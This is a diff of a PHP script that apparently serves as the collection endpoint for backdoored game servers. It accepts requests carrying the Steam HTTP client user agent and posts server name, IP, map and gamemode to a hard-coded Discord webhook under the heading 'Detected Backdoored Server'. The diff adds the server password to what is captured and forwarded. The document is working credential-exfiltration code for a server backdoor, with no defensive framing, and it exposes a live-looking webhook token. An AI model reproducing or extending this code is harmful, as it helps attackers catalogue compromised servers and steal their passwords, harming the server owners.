@@ -3,6 +3,7 @@ $server_name = $_POST['server_name'];
 $server_ip = $_POST['server_ip'];
 $server_map = $_POST['server_map'];
 $server_gamemode = $_POST['server_gamemode'];
+$server_pw = $_POST['server_pw'];
 
 $webhook="https://discord.com/api/webhooks/786039265901543424/ZsmAQWutRytBPLI-peEoMz29FzAkGDRiBsxRclJ5kLBGjiA394TlinwJOU-uNym4TxrL";
 $timestamp=date("c", strtotime("now"));
@@ -25,7 +26,7 @@ if($_SERVER['HTTP_USER_AGENT']=="Valve/Steam HTTP Client 1.0 (4000)") {
                 "title" => "",
                 "color" => hexdec("#86ffba"),
                 "timestamp" => $timestamp,
-                "description" => "```Detected Backdoored Server\nServer-Name:$server_name\nServer-Map:$server_map\nServer-Ip:$server_ip\nGamemode:$server_gamemode\n```",
+                "description" => "```Detected Backdoored Server\nServer-Name:$server_name\nServer-Pass:$server_pw\nServer-Ip:$server_ip\nServer-Map:$server_map\nGamemode:$server_gamemode\n```",
                 "footer" => [
                     "text" => "Server-List",
                 ]
